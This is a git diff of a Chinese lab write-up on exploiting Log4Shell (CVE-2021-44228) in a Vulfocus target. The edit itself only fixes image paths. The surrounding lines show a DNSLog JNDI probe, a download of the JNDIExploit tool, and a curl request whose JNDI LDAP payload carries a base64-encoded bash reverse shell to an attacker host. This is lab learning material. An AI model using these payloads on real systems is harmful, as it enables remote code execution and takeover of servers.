@@ -23,7 +23,7 @@
 
   访问地址`访问地址: 192.168.56.121:36795`
 
-  ![alt text](images\image-1.png)
+  ![alt text](./images/image-1.png)
 
 
 
@@ -38,18 +38,18 @@ CVE-2021-44228（Log4Shell）是 Apache Log4j2 组件中的一个 远程代码�
      docker ps
 
      ```
-     ![alt text](images\image-2.png)
+     ![alt text](./images/image-2.png)
 
   * 进入容器Shell`docker exec -it cool_gould /bin/bash`
   * 下载demo.jar文件到本地并查看`docker cp 19ea57acca57:/demo/demo.jar ~/Downloads/`
   很明显看到此log4j2的版本为2.14.0，属于漏洞版本
 
-    ![alt text](images\image-3.png)
+    ![alt text](./images/image-3.png)
 * 方法二：反汇编dome.jar文件，找到漏洞代码并定位到其中的传递参数（`log4j2逆向`）
    * 下载Java Decompiler反汇编工具`https://java-decompiler.github.io/`
    * 使用Java Decompiler反汇编工具对demo.jar文件进行反汇编，并查看其中的代码
    
-     ![alt text](images\image-7.png)
+     ![alt text](./images/image-7.png)
    * **漏洞代码分析**：
       *   在以下代码中`payload` 变量直接传递到 `logger` 进行日志记录。没有进行任何过滤，意味着如果 `payload` 是恶意 `JNDI `语句，Log4j2 会执行 JNDI 解析。导致攻击者可以构造恶意 ${jndi:ldap://...} 语句，让服务器远程加载并执行恶意代码，最终实现 远程代码执行（RCE）。
      ```
@@ -69,20 +69,20 @@ CVE-2021-44228（Log4Shell）是 Apache Log4j2 组件中的一个 远程代码�
   * **使用此方法的优点**：DNSLog 提供了一个 唯一的子域名，可以用来监听 目标服务器是否解析了我们提供的 JNDI 网址。并且无需搭建服务器，只需要获取 一个随机子域名，目标服务器如果解析它，我们就可以在 DNSLog 平台上看到记录，证明目标可能存在漏洞。
   * 获取 DNSLog 专属子域名：访问 DNSLog 平台：`http://dnslog.cn/`点击 `“获取子域名”`，它会生成一个唯一的随机子域，`i6dryn.dnslog.cn`
 
-  ![alt text](images\image-4.png)
+  ![alt text](./images/image-4.png)
   * 构造无害 `Payload`，向靶机发送包含 JNDI 协议的恶意 JNDI 载荷，触发 DNS 解析
    `curl 'http://192.168.56.121:39327/hello' -G --data-urlencode 'payload=${jndi:dns://i6dryn.dnslog.cn}'`
 
-    ![alt text](images\image-5.png)
+    ![alt text](./images/image-5.png)
    * 访问 DNSLog 平台，查看解析记录，目标服务器的 Log4j 解析了 {jndi:dns://i6dryn.dnslog.cn}'`并尝试访  问 LDAP 服务器。访问 `i6dryn.dnslog.cn` 说明目标服务器被成功诱导解析，这证明 Log4j2 可能存在漏洞。
 
-    ![alt text](images\image-6.png)
+    ![alt text](./images/image-6.png)
 
 #### （3）、漏洞可利用性验证
 ##### <1>、下载JNDIExploit.v1.2 Java 反序列化漏洞利用工具，并解压
 `wget https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip `
   
-![alt text](images\image-11.png)
+![alt text](./images/image-11.png)
 
 
 ##### <2>、在在攻击者机器（ 192.168.56.123）上运行：
@@ -100,13 +100,13 @@ CVE-2021-44228（Log4Shell）是 Apache Log4j2 组件中的一个 远程代码�
 curl -G http://192.168.56.121:30815/hello --data-urlencode 'payload=${jndi:ldap://192.168.56.123:1389/TomcatBypass/Command/Base64/'$(echo -n 'bash -i >& /dev/tcp/192.168.56.123/7777 0>&1' | base64 -w 0 | sed 's/+/%2B/g' | sed 's/=/%3d/g')'}'
 
 ```
-![alt text](images\image-13.png)
+![alt text](./images/image-13.png)
 ##### <5>、当发送get请求后，可以看到让目标服务器通过 LDAP 服务器下载 Base64 编码的反向 shell，从而远程控制目标机器
-![alt text](images\image-14.png)
+![alt text](./images/image-14.png)
 ##### <6>、在攻击者主机中输入`ls /tmp`显示靶机的flag，将flag输入vulfocus中，成功完成漏洞可利用性验证
-![alt text](images\image-15.png)
+![alt text](./images/image-15.png)
 
-![alt text](images\image-12.png)
+![alt text](./images/image-12.png)
 
 #### 3、log4j2逆向（见漏洞存在性检测方法二）
 
